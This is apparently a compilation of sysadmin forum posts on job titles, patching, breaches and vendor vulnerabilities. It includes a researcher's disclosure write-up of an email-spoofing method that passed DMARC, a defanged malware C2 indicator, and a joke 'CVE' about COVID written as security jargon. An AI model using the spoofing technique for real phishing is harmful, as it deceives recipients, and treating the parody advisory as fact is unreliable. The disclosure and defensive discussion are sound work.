Monitoring - SCOM / Zabbix / anything else that allows monitoring of Windows Server boxes - and alerting configuration 4. Patch Management process 5. Remote Access management - configuration of RDP / Proxy / other remote access solutions 6. Management tools - Windows Admin Center, Powershell 7, Sysinternals and others as needed 7.

Go easy on me... I feel like Im due to a title change at my job. Currently, Im the Network/Systems Administrator of a 35 person company. Ive been there 12 years, working my way up from tech support and SQL report writer to administrating/installing/maintaining systems such as: Meraki Firewall, switch and Wi-Fi \[ I replaced a Watchguard appliance that had been in place for years, which I also administered since the retirement of the former VP of IT\]; VPN access to the company \[I moved us all to working remotely in less than a week!\]; Cisco VOIP in-house Call Manager &amp; equipment; stand-alone VPN access point for vendor monitoring of our Oracle and SQL Servers \[of which there are 6 total in production alone\]; NTFS fileserver is all me, Active Directory/GPO/WSUS is all me; all the HW and SW maintenance; AV and backups are all me. In addition, recent years have seen me take over: most of the budget predictions for IT; I head up the yearly PCI pen testing and remediation; I admin the PCI quarterly vulnerability scanning and fill out the DSS SAQs; Im the lead IT personnel listed in all the Disaster Recovery/BCP documentation; I waded into Azure with a PCI compliant payment server housed there for network segregation; now, Ive built out a whole tenant for what started as employee and guest access for published PowerBI reports, but have recently started to migrate certain employees to the tenant for 365 and eventually cloud file shares \[we currently purchase our 365 accounts from our affiliated company so that our email domains match theirs, but that may be changing.\] Oh, all of this is still on top of tech support cause why would they need someone else when I can apparently do all of the above and still fix printers? This jack-of-all trades, master-of-none speech is not to try to fluff myself up but to see if my perception of growing outside of a network admin/systems admin role is legit or not. The writing on the wall is that I will soon be expanding out a whole new architecture through Azure for remote workers who have a business need to break away from our affiliate and start being solely within my administration, as well as needing a wholly cloud presence \[AKA no VPN\] for company resource access. I will learn all this, too. And alas, no story would be complete without an antagonist. There is a Director of Application Development and Infrastructure. He lobbied for that title before the old VP of IT left 5 years ago, so he could secure his future. He also thought that VP IT role was his, but our President saw fit to bring in a COO instead and put them over the IT Dept. After a few months of lobbying, he became my supervisor \[in a 4 person department, there are not a lot of people to manage so he got the Senior Developer and me under him.\] Well, hes not a great manager. He chased away 2 new employees and a contractor from a place with 0 turnovers outside of retirements, and has since been stripped of his managerial powers \[but not of his title/pay; he can be a real turd but apparently one made of Teflon.\] My biggest gripe is that he pretty much contributes 0% to the infrastructure, and I find myself having to explain everything from square one when he wants an update on something, because not only is he unfamiliar with how things are set up but he lacks experience in running them \[honestly, hes a senior developer who likes to make Gantt charts and to my knowledge has no job experience with hardware or networking, only know him to have a personal server and switch at home that hes set up.\] In fact when he first got the title, I just assumed it was Application Infrastructure but he insisted that no- it was referencing the whole data center. What does the above paragraph have to do with anything? Whew, maybe just to get that off my chest and vent- thanks! Oh, and also to the outside world it looks like we have a Director of Infrastructure running things but in fact you have the been there 12 years and taught myself all this from being in the field creating and maintaining in this environment day after day little old me running things and influencing the direction we go. As I mentioned, he's only listed on the disaster recovery plan as my backup, except for certain documents regarding software he's developed in-house. Of course, he makes over twice what I do and has a 2.5% larger bonus \[LIKE A BOSS.\] Yeah, it gives me sour grapes, but I know that my career wont be built on tearing anyone else down but rather building myself up. So, does anyone know of any IT titles that may be appropriate to my work duties? I feel like the security aspect of what I do is ignored, and thats a big one. I know a title is not an end all, be all thing but my company does value them. I appreciate anyone that even got this far, ha. TL;DR- yeah, dont read. Just me explaining job duties and brainstorming for a new title that might allow for some professional advancement."

What is really odd is that the KB number that was installed shows ""KB4561616"" and the correct date of install, but that is not the KB I installed or what the event log says I installed. Removal of this package fails. So now I have a DC stuck in DSRM mode with no networking. Submitted ticket to MS, waiting for call back. Anyone else seeing similar issues ?"

First of all, Im a teacher in a graphic &amp; web design department. I got a government grant to promote access to digital tools, hence a dedicated server for our department. So we got the box. A Lenovo monster with 1.5Tb of RAM and TBs of SSDs. My initial proposal called for: - a public facing web site for the department &amp; 30 graduates/year - a sandbox web intranet for unfinished student work (120 students): available from within the college network only - basic folders &amp; file sharing / dropboxes for teachers (8 full time + a few part timers) My initial ""ideal"" proposal was to use container-based lamp stack images for every web site instance. Every other part of the server is isolated from the container. Security wise, Id be tempted to place the docker volumes in an individual ZFS filesystem. So for you working pro web server admins, how would you config this? 1. Plain Ubuntu 20.04 server with 150 containers? 2. Plain Ubuntu 20.04 server with 150 chroots? 3. Plain Ubuntu 20.04 server with 150 users limited to their own home folders? Or 4. Your choice. The tech currently building this is a great tech, with security experience, but shes a noob at setting up a behemoth web server like this one. The tech that will maintain it during the academic year is a lower level tech. So, given the description above, would you recommend virtualizing Linux, Apache, MySQL, PHP on Docker? Hence having 150 containers and volumes to manage. Or... what would you pros recommend as a safer alternative, with less moving parts, less vulnerability to users breaking things? Any feedback will be helpful."

The majority of the servers (nearly 100) are Linux-based proprietary software appliances. It's a virtual environment and the ISOs/OVA used to build these virtual servers are provided by the vendors (Cisco, F5, RSA, IBM, etc). I already know these will not undergo a typical Linux process of package updates because most of the time vendors like to manage the update process to carefully control the stability of the server. They are also - more often than not - locked down from a CLI perspective. My question is, how do organizations typically ensure that vendor-supplied Linux based servers are ""secure"" from a vulnerability perspective when the vendors' update processes might differ from one to the next? Am I correct in assuming these systems somewhat less vulnerable from a security perspective due to the nature of them being locked down as they are? Should they be updated only when suggested by the vendor? This question really comes from something I've been asking myself lately: How can I be accountable to make sure all Linux based servers including proprietary software appliances are ""secure"" from a vulnerability perspective? Management has only asked me to ""manage the Linux servers, keep them up to date"". In this organization there is a clear divide in terms of responsibility. For these servers, other groups (development, networking) hold the main responsibility for managing them in day to day operation. I realize this is all is somewhat dependent on my organization and how it operates, but is there a general rule of thumb for how to deal with vendor-supplied Linux-based systems like these?"

I manage the IT department at a large school in Australia, I've recently setup a Honeypot on the BYOD wireless network to identify if any students are doing something they shouldn't. Within about 20 minutes I got two hits; Something was scanning the entire network and accessing ports 80, 443, 445, 1900, 2869 and 3389. Not only were they scanning, they were actively probing for vulnerabilities and delivering malicious payloads to the Honeypot server. In one instance CVE-2012-0152 was used in an attempted RDP DDoS attack. After some panic and investigation I discovered that Avast has a ""feature"" called Wi-Fi Inspector. This basically scans the users wireless network and tests for vulnerabilities, this feature is on by default but can be disabled. We have over 3000 students with BYOD devices, many with Avast installed scanning the network at least once per day. This is creating a huge overhead on our wireless network and seems like Avast is acting like a virus itself, especially seeing that the thing is crafting payloads and actively accessing resources it's not authorised to access. IMO this is a malicious practice and constitutes as a cyber security incident. I have no idea what Avast is doing with this collected data or what the purpose of the scan is as the end user received no notification that a vulnerability was even found! I called Australian Cyber Security Centre and they said I could report the activity and start an investigation. What do you guys think, is it worth the effort of reporting this?"

If I try to do nslookup, it returns an IP address that isn't even in my IP space (the first octet of the returned IP is correct, but the second is way out of bounds). I do know that it has a good IP, these tools just think it has a different IP for some reason. I also can't RDP the system through hostname or IP either, nor can I get powershell to do anything to them remotely (enter-pssession, any command with ""-computername"" parameter, etc all fail to connect, but I can remote powershell normally to systems that don't have this issue). If I physically go to the remote computer, and do an ipconfig on it, I see it's REAL IP, and there are no connectivity issues. I can also remote back to a server successfully, ping a server, browse the web, etc. The users of these problem computers haven't noticed anything and aren't complaining, but this has probably been an issue for quite some time. I need to get this fixed because although the users are able to do everything they need to do, this DNS issue seems to be what's causing these systems to also not be getting their security updates correctly and it's showing on our vulnerability scans. I feel like it's gotta be something DNS related, but because (seemingly) the hostname resolves to the incorrect IP, I can't do ipconfig /flushdns or /release &amp; /renew, etc. without physically going to each one of these systems and doing it manually. It's gonna be a huge hassle if I have to track down each one of these manually - does anyone know of a way that I could remotely flushdns or something that I could just try? Everything on Google is saying ""It's easy! just invoke-command -script {ipconfig /flushdns} -computername 'cpname'"" But the -computername parameter for any powershell command fails on these computers, probably because it's resolving to the wrong IP. This has been driving me nuts for a while now. Hopefully I'm just doing something dumb and someone can point it out. I greatly appreciate any suggestions."

I just got an email from VMHaus about a breach. Original email copypasta below. --- On the afternoon of Sunday 24 May 2020, we became aware that a stolen copy of a database backup containing some of our customers' personal data dating from 30 October 2018 had been posted online. We regret to inform you that your account was included in this breach. Even if you are no longer a customer and your account has since been deleted, it was in our database on 30 October 2018 when the data was taken. The compromised data includes the names and contact details for everyone who was or had been a customer on 30 October 2018, including their email addresses, postal addresses and phone numbers. It also holds cryptographically hashed copies of control panel passwords, some details of payments made, and the content of every support ticket they had filed. Details of your services, including hostnames and IP addresses, were also leaked. While this is clearly a very serious data breach, the database does not have any credentials for accessing servers, unless they were disclosed in support tickets and not changed in the following 18 months. Nor do the payment details contain any credit card or bank account numbers, and as all payments are received via PayPal, we could not access that information if we wanted to. No filesystem snapshots are included in the compromised data, so we are completely confident that any data on your server remains secure. Cryptographically hashed passwords are the industry standard for storing login details to websites, and they provide a reasonable degree of security in the event that the database is compromised. However, when insecure passwords have been used, such as dictionary words, common names or dates of birth, they can be cracked fairly easily offline. Mindful of this, we have disabled any accounts that have not since been removed and whose password has not been changed since 30 October 2018. If this applies you will need to do a password reset before you can log in. There is a link to do this on the login page: URL If you use the same password on other systems, please reset those passwords too. It is best practice to use a separate, randomly generated password for each site, and store these in a password manager or other secure location, than to memorise a single password which you use on everywhere. We have clear and compelling evidence that this data was posted online by a former director of VMHaus Ltd named Wai Hoe Au Yong, who also uses the online name Auriga. We believe that he illegally took a copy of this data shortly before his access to VMHaus systems was revoked as part of the acquisition by Mythic Beasts. This was not the result of a security vulnerability, but the illegal actions of an individual who had legitimate access to the server at the time. Nevertheless, the breach is of course deeply unfortunate and we are very sorry for the inconvenience and confusion it has caused. We believe openness is the best policy in responding to this incident, and have published a full statement on our website: URL VMHaus will never email you asking for payment details, server credentials or passwords. All payments are taken by Paypal which is accessed through our control panel: URL If you have any questions or concerns, please contact us by email to admin@vmhaus.ltd.uk, submit a ticket in our control panel, or use the @VMHausOfficial twitter account.

Specifically, details regarding the threats associated with each application and program. The organization has \~1500 employees, all expected to be collaborative and functional in a virtual environment. The main concern is the level of vulnerability each program has. In terms of a recommendation, I believe Cisco may be a better option for the time being considering all of the notoriety surrounding Zoom and it's management/distribution of data. I would consider effective management practices to be more important than being devoid of flaws in regard to sustainable and continuous security. I am more versed in management practices rather than cybersecurity specifics, which is why I'm requesting insight from those with experience in this field. If anyone has any specifics on the different threats and vulnerabilities facing both (web browser &amp; application), it would be a great help to initiate an effective analysis into each potential threat, and ultimately support a recommendation that best suits the most secure option available. Thanks in advance! I appreciate any insight/experience with either application."

Hello and thank you for any advice you may be able to provide me, figured I needed to ask people who might actually know what they are doing. I am somewhat new to a lot of this so if I say something stupid please tell me as such. Anyways I have been getting into a lot of penetration testing and bug bounty stuff and to practice this they make intentionally vulnerable web apps (metasploitable, owasp juice shop, bWAPP, mutillidae etc.) Now these are designed to be only used on a local host or as a VM because only an idiot would put something intentionally vulnerable on an actual server. Well I decided I want to be an idiot and place them on a server, mainly to consolidate them all into an easy to access medium and also just because I can. The project. I decided to make a project out of this and for a couple of reasons I decided to set it all up on a raspberry pi 4 I have. The main reasons were because it would allow me to have one dedicated spot for everything and also I would be able to isolate the pi to a guest network at home so that it's vulnerability wouldn't expose my actual home network to attack. Now setting up a LAMP stack in the pi wasn't too terrible (a bit of a learning curve as I had experience with linux but none of the other programs) and to kind of host everything I added wordpress and linked it all to a free noip dns domain name. All of that is working fine and I can access it all from other computers (through VPN because it has to be outside the network due to firewall fuckery). The problem As I said before this stuff isn't designed to be hosted like this and I've managed to get around some of it but the main one I want is called metasploitable because it's a package of several of these and works really well but it is only available is VM format. I've looked into ways to run a vm as a server but the software im seeing to do that requires a lot of ram, or at least more ram than my pi 4 has (it's the 2gb not 4gb model) so is there a way to extract the files from the vm so I can run it like a regular php site? I know vm largely means java but I have no real experience with it or integrating it into a server designed to work off php. Additionally there are some of these that are designed to be run off node.js but I fear they might interfere with the setup as well but I don't know. I feel like I'm trying to mix a bunch of different systems that aren't designed to all be run off the same server or at least this type of server. Either way I've made good backup images just in case I break everything so if you have any input please let me know, thanks sorry for the long read."

Specifically, an deserialization flaw exists in the bind_ace2() function of the pulmonary/alveoli.c component when the cell replication software fails to verify unauthenticated protein message codes. The vulnerability allows an unauthenticated attacker with network access to send crafted oxygen packets containing serialized mRNA objects via respiratory protocol to inject shellcode, triggering remote code execution on the cellular application level. Successful exploitation may lead to local escalation of privilege and lateral movement to other hosts on the same broadcast address. In certain cases where system uptime is greater than 2147483648 seconds (~68 years), a denial of service (resource exhaustion) may occur in the immunity subsystem due to excessive cytokine requests, leading to system hangs or unrecoverable crashes.

Some of the files attached in emails have names like ""COVID-19 vaccine"" or ""COVID-19 treatment"", etc. that would easily bait someone into opening them.

This malware uses phantom101.duckdns\[.\]org for command and control (C2). WarZone is a commercially available RAT commonly used by cybercriminals. &gt;* A HM Revenue and Customs (HRMC) phishing kit is being used to target UK-based victims with a lure referencing COVID-19 relief funds ([CSA-200384](URL SMS messages contained an embedded URL directing the user to a phishing page impersonating the HMRC website.

For a long while, we ran our own vulnerability scanner to scan clients sites/firewalls/servers and provide security reports to them etc (part of our MSP offering basically). This ran the older OpenVAS scanner, and older GVM versions. When I set that up years ago, I remeber having a very hard time getting the SCAP/.CVE/NVT/CERT data updated (and keeping it up to date). Recently, the old scanner version in use on that server was causinga load of issues, mostly that scans were now bugged out, and 80% of them would have the status ""Stopped at 1%"" for no reason, and I'd be unable to re-scan that target. The only way to fix, was to upgrade to the latest GVM and OpenVAS scanner versions. So I did that, but it's a destructive upgrade, it doesnt retain scan/target/task/schedule data. In light of that, I blew the entire system away and reinstalled the latest GVM and OpenVAS scanner components. Everythigns working fine, new scanner is faster, GVM is less glitchy, but I have one issue... The method of updating SCAP/CVE/NVT/CERT data is unreliable. The initial setup stages (running gvm-setup at console) did the initial data sync, and from there Feed Status said it was up to date. Great. Now I'm 3 days on, and I have alerts saying there are 200 new NVT's and 40 new CVE's, Feed Status says 3days old. I run: `/usr/sbin/greenbone-scapdata-sync` `/usr/sbin/greenbone-certdata-sync` ...these run, and I can see in ps aux that there are tasks running relating to the resync of data: `gvmd: Syncing SCAP` `gvmd: Updating NVT cache` `gvmd: Reloading NVTs` The SCAP one takes some 50minutes.. And then completes, as do the others. But I go back to Feed Status, and it still says 3 days old. I've restarted GSAD, and GVMD, yet the Feed Status still says out of date.

Came in did a year and a half of desktop support and then through a relationship with my bosses boss managed to swing a job that would groom me for sys admin. Basically the job would start as help desk with some sys admin and net admin duties and then eventually promote to sys admin. Well that was six months ago and my boss called me friday night and told me my promotion came through and Ill be doing more sys adming / net admin / sec admin stuff. Yes thats a lot of hats but we're a small company of 150ish employees with 2 IT guys. We're adding a third and Ill be assisting him with help desk when he gets slammed but Sys admin, net admin, sec admin are my new main roles. Question is title. I get to pick mine. I have very little interest in networking so I dont want network admin. That doesnt mean I'm not familiar with networking / virtual networking and the basics of firewalls, switches, and vpn's its just not the role I want to go down if that makes sense. I am interested in security and system administration. System admin is probably the best choice I guess but wanted to ask you all if there was some kind of hybrid title I could get to also show that Ill be responsible for tenable.io , remediation, vulnerability scans, etc? Systems and Security Admin sounds nice in my head but just not sure its an actual legit title..."

124,vulnerability,sysadmin,Spoofing any other customer with Mimecast - The Saga,1,f9ybu1,https://www.reddit.com/r/sysadmin/comments/f9ybu1/spoofing_any_other_customer_with_mimecast_the_saga/,2020-02-27 06:07:53,"This is something that was very important to me as I wanted to follow it through to completion, I wanted to post it here as I know I give praise to Mimecast a lot for their products sauce. Though I do want to discuss the vulnerability that I discovered and how it was handled. As this community discusses a lot of email security. Now for the actual content, unfortunately /r/syadmin seems to ban embedded images so all I do is link them here. \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ I want to start and say this was something completely new to me, my only other previous security research experience was something a coworker noticed and I helped report. So what went wrong, to me the backstory is pretty interesting. A little over a year ago [this](URL was posted on Reddit. In short, the poster violated their mail providers Terms of Service by sending mail as another customer. While yes it shouldnt have been done it was fairly harmless in the grand scheme of things. Though this kind of independent third-party testing and disclosure, while the poster did not appear to do a responsible disclosure. They were not encouraged to by the vendor, as the vendor just said our policies should have prevented this instead of a technical solution. At the time this was released I was getting pretty heavy with email architecture and email security. My employer has a unique need to be able to send as multiple primary email addresses. This is something we had talked about before we ever purchased Mimecast, as I had heard about how Cracker Barrel uses Mimecast to do address rewrites. While this may not sound unique to everyone reading this, to me it was a first and I need to find a way to do it at scale without significant costs while creating easy integrations. About a year after we purchased and implemented Mimecast I was getting more into this requirement and decided to try out the address alternation rewrite functionality. In this demo, we had domainb.com in another Mimecast account than our primary and I was doing a demo on the fly. So during the demo, we changed the RFC5322.From and everything passed as far as SPF went, and the user was super happy! Also during that demo, we tested sending a calendar through the address rewrite and that failed, I ended up doing some more digging and noticed this was a bug. Please note that this is still not fixed and active (Ticket opened 3/12/2019), under this we learned that calendar invites were not being rewritten and failing back to our primary domain and didnt pass DMARC. ## Spoofing Sadly before when this happened I wrote it off and didnt think too much about the fact that I was able to send mail as domainb.com when I was in the Mimecast account for domaina.com. Now on June 10th (6/10/19) I did some more testing and was curious about how far I could extend this. To start I was curious if I could spoof my own personal domain of wesleyk.me. To do this is actually quite simple from within the Mimecast portal. After I added it then I just had to send mail as me to my personal domain. Do note that this failed as wesleyk.me is protected by DMARC and GSuite observed that, though it pointed out an issue that Mimecast was allowing me to send mail as domains that I didnt own. [Spoofing ADR](URL My next test for further exploitation was more evil but I wanted to see what could be done. Knowing how email works makes testing this very simple, we can start by knowing the default MX records for Mimecast are us-smtp-inbound-1.mimecast.com, and us-smtp-inbound-2.mimecast.com. Now we can work on finding a domain that has these same MX records so we can determine who is a customer. This is easier than a bunch of misc searching thanks to one of my favorite websites. [ViewDNS.info](URL has an easy search function for a reverse MX lookup that we can run like [this](URL Please note that DNSTrails can also do this as shown [here](URL From a list like this, we can easily export the data and start sending as other customers. Once weve tested sending as other customers we can take it another step further and find large brands that utilize Mimecast for Inbound and Outbound email, as well as have a p=reject DMARC policy. From doing a little research using all public information we can find brands such as [Zendesk.com](URL and [MissUniverse.com](URL and see what damage could be done. Neither of these brands were used during my testing, instead of finding a major high profile brand. I simply exported the list from viewdns.info, and wrote a quick script to go and find domains that had an MX record for Mimecast and a p=reject DMARC record. This took only about 10 or so minutes and we were in business. From this point, we know that we can spoof non-customers and customers, though can we spoof customers and pass DMARC? By using our address alteration policy above we can change our original email address to one of these domains. Ive edited out the domains that I spoofed for privacy reasons. At this point, I disclosed the vulnerability to Mimecast through a support ticket on 06/11/19 [DMARC Pass](URL &amp; [DMARC Pass Body](URL From the images above we can see a few interesting things. 1. The IP of [63.128.21.105](URL belongs to Mimecast so we know Mimecast send the mail 2. SPF passed, we know this due to the RFC5321.From aligning to the domain via this SPF record 1. v=spf1 include:\_netblocks.mimecast.com \~all 3. DMARC passed. this is what makes this severe. DMARC is supposed to be one of the end all email security protocols to where you explicitly authorize a sender to spoof your domain for legitimate purposes. Now what we can learn from this? Since were able to pass DMARC via the SPF mechanism, anybody that is the first person to receive our mail will have it automatically pass all authentication checks. As well as any mail that is a forward and keeps passing through Mimecasts servers will be authenticated even though theyre exploding the message as it comes from their authorized IPs. We cant pass DKIM checks due to we dont have control of the DNS zone. We can prevent DMARC failures simply by never DKIM signing the mail once it leaves our environment. We can investigate why this happened even further, if you look at the Transmission event you will see Email Received via Authorized IP address. This occurred due to how the Mimecast platform works, their own IP addresses are authorized IP addresses since the platform can be used to send an email when your backend mail server is down. Due to the lack of proper checks for if youre allowed to send as any domain has caused some significant issues for them. [Mimecast message details](URL ## Further Exploitation On October 28th I was fortunate to be able to attend Mimecasts first security conference down in Dallas, TX. At their conference, they had training going on, and we all had access to their mimecasteducation.com training tenant. Now, this can get fun, if we do some MX/[SPF record lookups](URL we can see that mimecast.com is hosted in their EU grid. We can also determine that [mimecasteducation.com](URL is hosted there as well. Knowing this information and knowing that the SPF record is there, I was able to successfully do an address alternation and pass DMARC for Mimecast.com. [Spoofing of Mimecast.com](URL During my initial testing, I tried this and partially failed as I didnt have access to their EU grid. Though both of these are highly worrying as I was able to successfully send emails as their primary brand and get it delivered. [Mimecast.com Non EU Grid](URL Note: Since were not able to run a MITM attack or hijack the domain/DNS we can only send mail. Though if we want to be tricky we can set the reply to (RFC5322.Reply-To) address in the mail field to an email address that we control, or even register a similar domain. Then make our email on the left half of the email address the same, assuming the user falls for our initial spoof we can successfully continue phishing and expand into social engineering. Since were able to pass email authentication checks. All of this should be successful in theory as DMARC does not verify the RFC5322.Reply-To header. ## Timeline * 06/11/2019  Initial disclosure date * 06/24/2019  No follow up on my ticket, so I contacted my Customer Support Manager and sales rep to escalate this. At this point, it had been 13 days since disclosure with no acknowledgment of the issue. * 06/25/2019  I received an internal email forward stating this * REDACTED and I have been in communication with the internal disclosures team since the time of Wesleys report. We had a conference call with product on Friday and expect to have a call arranged with the customer early this week. Please let REDACTED or I know if you have any questions. * This is good to know that they were in communication with Engineering, I looked up the name of the person who sent the above response. Theyre a manager of support at Mimecast * 06/28/2019  I had a call with their engineering/security team on that theyve confirmed whats going and theyre working to fix it. I was notified at this point it would take about one month to fix * 08/06/2019  No response or fix from the previous call, so I reached out to my contacts again * 08/12/2019  No response so I emailed my original Mimecast ticket to their disclosures distribution list with this context * Mimecast Disclosure Team,Can you please provide an update on the disclose submitted under REDACTED. Its been 1.2 months since my last call with Mimecast, and on that call it was estimated to have it fixed within 1 month. * 10/11/2019  Still no confirmation or timeline of it being fixed, I contacted my contacts again to try and get some traction * 10/28/2019  Successful spoof of Mimecast.com * My account manager emails me the internal code name for the project, this is wonderful news as Im at the Mimecast conference. I was able to get a few technical details but not the explanation behind them. * In more fun news I was wearing my Disclosures T-Shirt from a previous Mimecast Disclosure that didnt fully classify * Pictures * [Me at CRSummit19](URL * [Mimecast Security Shirt](URL * [Security Pwn Star](URL * 10/29/2019  I attended one of the few technical deep-dive sessions which was fantastic by the way. At the end of it, I got a sneaking suspicion that this person might be able to give me some more info. After the session ended and they had finished talking in the room, I went up and introduced myself and mentioned that I had an internal project name and I was wondering if they knew anything about it. Once I told them the code name, they said lets go over here and talk. It was at this point where I finally found the right person to talk to, and I got the technical information I was looking for and got some influence over the final decision. I would like to give this VP some kudos for finally helping me out, it only took an English person to travel halfway around the world and for me to travel halfway across the country to Dallas. To meet and happen to run into each other. A fun anecdotal thing is while we were talking, they mentioned they all the employees were talking about the guy wearing a disclosure shirt at the conference. For those not familiar with Mimecast there are maybe 20 of these shirts given out and incredibly rare, its a swag item for disclosing a vulnerability. My employer happens to have 2 people who have them. * 12/16/2019  Mimecast acknowledges my request to place my name on their [Security Researcher Hall of fame](URL Its at this point that I [announce](URL what has taken place on my [LinkedIn](URL * 12/17/2019  My Mimecast account team reached out to me with an urgent request to schedule an emergency meeting with their CISO and product. Whats been interesting to me is I know their CISO has known my name for quite a few months, due to emails sent to me. As well as one of the people from the product on this call Ive been trying to get a meeting with for other issues since the beginning of November. * 12/19/2019  The call happens and Mimecast is now involved from a technical reviewer in this blog post. * 12/20/2019  I notice that the fix has been rolled out worldwide, while testing I discover another vulnerability and disclose it. * 1/9/2020  I spoke with my Mimecast account manager and she said Mimecasts legal and Marketing teams had no comment on any details and Im free to post it. I would like to say I mentioned the other vulnerability and they did not have comments on it happening before this post was released. ## Reflections What could I have done better? Since I had never done this before I disclosed the vulnerability through my employer via their support channel instead of independently. If I would have disclosed independently I would have been better protected and removed my employer from the risk. I could have also observed the security communities 90 days responsible disclosure period which I was unable to follow. This breaks down to morals for me, as well as my employer was personally affected by this vulnerability as well as every Mimecast customer in the world. I should have done more Googling and found their [disclosure submission system](URL What I did right. No matter what faults happened from Mimecast or me from not disclosing it properly. The internet and Mimecasts customers are now safer. Im proud of myself for being able to work with such an established company and to be able to find something of this scale. I just wish Mimecast would have appropriately communicated due to the unique situation I was in. ## Things I could have done I could have easily expanded this to more sophisticated attacks though, that would dive deeper into social engineering which this vulnerability was not about. BIMI  A very new protocol called BIMI (Brand Indicators for Message Identification) requires your domains DMARC policy to be on 100% quarantine or reject status. At this point, youre able to place an SVG image that will be displayed right alongside your authenticated email. Since we were able to pass DMARC if a brand fell into the BIMI beta program and I was able to spoof them and pass DMARC via the vulnerability. It would have been possible to show the companys logo alongside our spoofed email. BIMI is so small right now Im not sure if it would have possible to provide a real-world POC, though the concept is valid. &amp;#x200B; Disclosure: My employer is a Mimecast customer, I'm an independent user of the product through them.

At least wireless has the authentication process of a key or file or whatever. Am I way off base thinking that not having that for Ethernet seems like a huge vulnerability? Would the machine need to be recognized by activedirectory or some other workstation management type system to be able to start probing network resources? Is the security of Ethernet reliant on only trusted machines being able to physically plug in, or is there more to it?

Here's the summary and a link with more info. Yay, my day turned into a patching day... meh. &amp;#x200B; The NSA has discovered a critical vulnerability (CVE-2020-0601) affecting Microsoft Windows cryptographic functionality. The certificate validation vulnerability allows an attacker to undermine how Windows verifies cryptographic trust and can enable remote code execution. **The vulnerability affects Windows 10 and Windows Server 2016/2019** as well as applications that rely on Windows for trust functionality. Exploitation of the vulnerability allows attackers to defeat trusted network connections and deliver executable code while appearing as legitimately trusted entities. Examples where validation of trust may be impacted include: * HTTPS connections * Signed files and emails * Signed executable code launched as user-mode processes The vulnerability places Windows systems at risk to a broad range of exploitation vectors. NSA assesses the vulnerability to be severe and that sophisticated cyber actors will understand the underlying flaw very quickly and, if exploited, would render the previously mentioned platforms as fundamentally vulnerable. The consequences of not patching the vulnerability are severe and widespread. Remote exploitation tools will likely be made quickly and widely available. Rapid adoption of the patch is the only known mitigation at this time and should be the primary focus for all network owners. &amp;#x200B; Additional information about this vulnerability can be found here: [URL"

The following day, we began to receive reports that some of our users were experiencing intermittent internet connectivity issues. Were unable to ping the Gateway from the affected machines, but we have been able to ping the loopback address and the affected machines own IP Address. So far, this has been able to be resolved through a restart; however, wed like to find a long-term solution to this problem. The only commonalities that weve found between the affected machines are the security patch, and the fact that they were all on Windows 1903. So far, weve attempted the following fixes: We disabled the firewalls, which did not resolve the issue. We updated from 1903 to 1909, which did not resolve the issue. We updated the Network Drivers on one of the affected machines and are monitoring its activity to confirm that this either did or did not resolve the issue. We have disabled Sleep Mode, as the issue occurs in the mornings, generally, after the computer has been idle for a long period of time. After checking Networking Logs, we came to the conclusion that this issue does not stem from a switching issue. Were confident at this point that this is an issue on the machine side of things, not the network side."
154,vulnerability,sysadmin,Response from ConnectWise CEO,1,etj29z,https://www.reddit.com/r/sysadmin/comments/etj29z/response_from_connectwise_ceo/,2020-01-25 11:07:44," From recent email: Dear Partners, Earlier this week, a story was published about potential security vulnerabilities with ConnectWise Control. In the spirit of transparency, I wanted to provide an update on this story and outline what has been done and what our ongoing efforts are to ensure the security of our products, your business and your customers. In late September, ConnectWise received notification from an organization that operates as a consultant in the security space, stating they had identified eight potential vulnerabilities in ConnectWise Control. While our product and security teams felt that many of these potential vulnerabilities presented a low risk of actual attack to our partners, we take security extremely seriously and investigated, resolving six of the areas of concern by October 2, 2019. While the threat landscape is ever changing, we seek to constantly and proactively manage security efforts not only through the updating of our products, but through the education of our team and collaboration with third-party security experts. As security is of critical importance to us, here are some of things we have been doing and where we are today: ConnectWise recently passed an independent SOC 2 Type 2 audit for the benefit of all current and prospective Partners. We regularly conduct penetration tests performed by both internal and external resource and have implemented ethical hacker training, OWASP processes, and consistently run vulnerability assessments on our systems and products. We have implemented tools that automatically evaluate behavior to reduce misuse of our products, started implementing machine learning to detect anomalies in logins, and we are about to launch a bug bounty program, as well as started the rollout of MFA and SSO across the platform. In Q4 of 2019, we also invested in a comprehensive developer security training curriculum to increase the security skills of our teams and assure that our developers are training on the most recent and relevant application security coding practices. On January 21, 2020 we launched the ConnectWise Security Trust site, which will be a primary source of information on security incidents, relevant alerts and of course critical patches and product updates. We hired GuidePoint, an independent third-party cybersecurity solutions company, to further validate our patches and confirm that the vulnerabilities were mitigated. We have published a matrix outlining each potential vulnerability with the perspectives from Bishop Fox, Huntress Labs and GuidePoint, along with our stance on the issue and any action being taken. One of the remaining two suggested areas of remediation is Cross-site Scripting (XSS) which is the potential for abuse of the Control Administrator roles ability to customize the application. This customization ability is a key feature of Control that many partners value. This issue is considered a low actual risk, but we will be removing the option from our trial offering. The final identified issue is related to Security Headers. The strongest defense involves layers of security. Security Headers represent one option for implementing certain layers. In the absence of Security Headers, ConnectWise does implement security layers addressing the types of threats reported in the consultants assessment. As we continue to investigate potential vulnerabilities and implement mitigation plans, we will be posting updates to our Security Trust site. I encourage you to check this site for the latest information, as well as furture updates from our work with GuidePoint. In our conversations with Huntress Labs to compare our findings and their results, Kyle Hanslovan, CEO of Huntress Labs has this to share: Bugs happen. And its not about when bugs happen, but its about what you do when they happen. We were happy to work with CRN earlier this week to confirm that ConnectWise had already patched 6 of the 8 items found. I think three things matter in this scenario: Were the bugs acknowledged, were the bugs fixed and was the company passionate about fixing them for the right reasons? I think ConnectWise came through on all three things, and after our positive conversation on January 23, were excited about continuing to work with ConnectWise and other vendors for the benefit of the channel as a whole. I want to assure you, our partners, that we understand the trust you place in our products and people and we take that trust seriously. We have and will continue to invest heavily in security, and you have our unrelenting commitment to security and transparency, and we appreciate your questions and feedback to our continuous improvement. Thank you, Jason Magee"
